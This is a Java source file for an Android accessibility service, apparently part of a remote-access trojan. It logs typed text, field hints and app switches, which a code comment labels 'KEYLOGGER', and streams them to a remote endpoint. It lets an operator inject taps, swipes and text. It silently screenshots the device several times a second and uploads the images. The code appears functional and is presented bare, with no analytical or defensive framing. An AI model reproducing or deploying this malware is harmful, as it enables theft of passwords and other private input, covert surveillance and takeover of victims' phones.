package com.aval.seg;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Bitmap;
import android.graphics.Path;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.view.Display;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.ByteArrayOutputStream;

public class KeySvc extends AccessibilityService {

    public static volatile KeySvc I;
    private final Handler H = new Handler(Looper.getMainLooper());
    private final StringBuilder buf = new StringBuilder();
    private String bufPkg = "";
    private volatile boolean shotOn = false;
    private volatile boolean shotBusy = false;
    private long lastFlush = 0;

    @Override public void onServiceConnected() {
        I = this;
        Net.start(this);
        H.postDelayed(flush, 1200);
        H.postDelayed(loop, 400);
    }

    @Override public void onDestroy() { I = null; super.onDestroy(); }

    @Override public void onInterrupt() {}

    // ---------- KEYLOGGER ----------
    @Override public void onAccessibilityEvent(AccessibilityEvent e) {
        if (e == null) return;
        int t = e.getEventType();
        String pkg = e.getPackageName() == null ? "?" : e.getPackageName();

        if (t == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            CharSequence txt = (e.getText() != null && !e.getText().isEmpty()) ? e.getText().get(0) : "";
            add(pkg, String.valueOf(txt));
        } else if (t == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            CharSequence cls = e.getClassName();
            flushNow();
            Net.send("{\"t\":\"app\",\"p\":\"" + Util.esc(pkg) + "\",\"w\":\"" +
                    Util.esc(String.valueOf(cls)) + "\",\"ts\":" + System.currentTimeMillis() + "}");
        } else if (t == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            AccessibilityNodeInfo n = e.getSource();
            if (n != null) {
                CharSequence hint = n.getHintText();
                if (hint != null) add(pkg, "\n[" + hint + "] ");
            }
        }
    }

    @Override public boolean onKeyEvent(KeyEvent e) {
        if (e.getAction() == KeyEvent.ACTION_DOWN) {
            int k = e.getKeyCode();
            if (k == KeyEvent.KEYCODE_DEL) add("kbd", "\b");
            else if (k == KeyEvent.KEYCODE_ENTER) add("kbd", "\n");
            else if (k == KeyEvent.KEYCODE_TAB) add("kbd", "\t");
            else if (k == KeyEvent.KEYCODE_SPACE) add("kbd", " ");
        }
        return false;
    }

    private void add(String pkg, String s) {
        if (s.isEmpty()) return;
        synchronized (buf) {
            if (!pkg.equals(bufPkg) && buf.length() > 0) flushNow();
            bufPkg = pkg;
            buf.append(s);
            if (buf.length() > 180) flushNow();
        }
    }

    private final Runnable flush = new Runnable() {
    @Override public void run() {
        flushNow();
        H.postDelayed(this, 1500);
    }
};

    private void flushNow() {
        String out; String pkg;
        synchronized (buf) {
            if (buf.length() == 0) return;
            out = buf.toString();
            pkg = bufPkg;
            buf.setLength(0);
        }
        lastFlush = System.currentTimeMillis();
        Net.send("{\"t\":\"keys\",\"p\":\"" + Util.esc(pkg) + "\",\"s\":\"" +
                Util.esc(out) + "\",\"ts\":" + lastFlush + "}");
    }

    // ---------- CONTROLE ----------
    private DisplayMetrics dm() {
        DisplayMetrics d = new DisplayMetrics();
        Display dis = getSystemService(android.hardware.display.DisplayManager.class)
                .getDisplay(Display.DEFAULT_DISPLAY);
        dis.getRealMetrics(d);
        return d;
    }

    public void touch(float nx, float ny) {
        DisplayMetrics d = dm();
        Path p = new Path();
        p.moveTo(nx * d.widthPixels, ny * d.heightPixels);
        tap(p, 60);
    }

    public void swipe(float x1, float y1, float x2, float y2, int ms) {
        DisplayMetrics d = dm();
        Path p = new Path();
        p.moveTo(x1 * d.widthPixels, y1 * d.heightPixels);
        p.lineTo(x2 * d.widthPixels, y2 * d.heightPixels);
        tap(p, ms);
    }

    private void tap(Path p, int ms) {
        GestureDescription.StrokeDescription s =
                new GestureDescription.StrokeDescription(p, 0, Math.max(40, ms));
        dispatchGesture(new GestureDescription.Builder().addStroke(s).build(), null, null);
    }

    public void key(int code) {
        switch (code) {
            case 1: performGlobalAction(GLOBAL_ACTION_HOME); break;
            case 2: performGlobalAction(GLOBAL_ACTION_BACK); break;
            case 3: performGlobalAction(GLOBAL_ACTION_RECENTS); break;
            case 4: performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS); break;
            case 5: performGlobalAction(GLOBAL_ACTION_QUICK_SETTINGS); break;
            case 6: performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN); break;
        }
    }

    public void setText(String s) {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;
            AccessibilityNodeInfo f = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
            if (f == null) f = root.findFocus(AccessibilityNodeInfo.FOCUS_ACCESSIBILITY);
            if (f == null) return;
            Bundle b = new Bundle();
            b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, s);
            f.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
        } catch (Throwable ignored) {}
    }

    // ---------- SCREENSHOT FALLBACK (sem MediaProjection) ----------
    public void screenOn(boolean on) {
        shotOn = on;
    }

   private final Runnable loop = new Runnable() {
    @Override public void run() {
        try {
            if (shotOn && !ScreenSvc.alive && Build.VERSION.SDK_INT >= 30) grab();
        } catch (Throwable ignored) {}
        H.postDelayed(this, 340);
    }
};

    private void grab() {
        if (shotBusy) return;
        shotBusy = true;
        takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(),
            new TakeScreenshotCallback() {
                @Override public void onSuccess(ScreenshotResult r) {
                    try {
                        Bitmap hw = Bitmap.wrapHardwareBuffer(r.getHardwareBuffer(), r.getColorSpace());
                        Bitmap soft = hw.copy(Bitmap.Config.ARGB_8888, false);
                        r.getHardwareBuffer().close();
                        Bitmap small = Bitmap.createScaledBitmap(soft,
                                ScreenSvc.W, soft.getHeight() * ScreenSvc.W / soft.getWidth(), true);
                        ByteArrayOutputStream bo = new ByteArrayOutputStream();
                        small.compress(Bitmap.CompressFormat.JPEG, ScreenSvc.Q, bo);
                        Net.sendBin(bo.toByteArray());
                        soft.recycle(); small.recycle();
                    } catch (Throwable ignored) {
                    } finally { shotBusy = false; }
                }
                @Override public void onFailure(int code) { shotBusy = false; }
            });
    }
}
